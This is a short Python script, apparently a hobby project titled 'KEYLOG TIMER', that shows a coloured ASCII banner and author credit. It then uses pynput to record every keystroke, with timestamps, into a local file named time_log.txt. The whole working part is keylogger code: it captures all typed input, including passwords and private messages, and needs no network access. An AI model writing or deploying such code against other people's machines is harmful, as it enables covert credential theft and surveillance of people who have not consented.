from pynput.keyboard import Listener
import logging
import sys
import time

class Colors:
    CRED2 = "\33[91m"
    CBLUE2 = "\33[94m"
    ENDC = "\033[0m"


banner = ("""


██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗     ████████╗██╗███╗   ███╗███████╗██████╗ 
██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝     ╚══██╔══╝██║████╗ ████║██╔════╝██╔══██╗
█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗       ██║   ██║██╔████╔██║█████╗  ██████╔╝
██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║       ██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗
██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝       ██║   ██║██║ ╚═╝ ██║███████╗██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝        ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝

                                                                                              v1.0 """)

for col in banner:
    print(Colors.CRED2 + col, end="")
    sys.stdout.flush()
    time.sleep(0.0025)

x = ("""
            Author:  Yusuf Ali Koyuncu | JimySheepman
            Github:  https://github.com/JimySheepman \n """)
for col in x:
    print(Colors.CBLUE2 + col, end="")
    sys.stdout.flush()
    time.sleep(0.0040)

y = "\n\t\tPress Ctrl + c to terminate the program...\n"
for col in y:
    print(Colors.CRED2 + col, end="")
    sys.stdout.flush()
    time.sleep(0.0040)

z = "\n"
for col in z:
    print(Colors.ENDC + col, end="")
    sys.stdout.flush()
    time.sleep(0.4)


logging.basicConfig(filename=("time_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
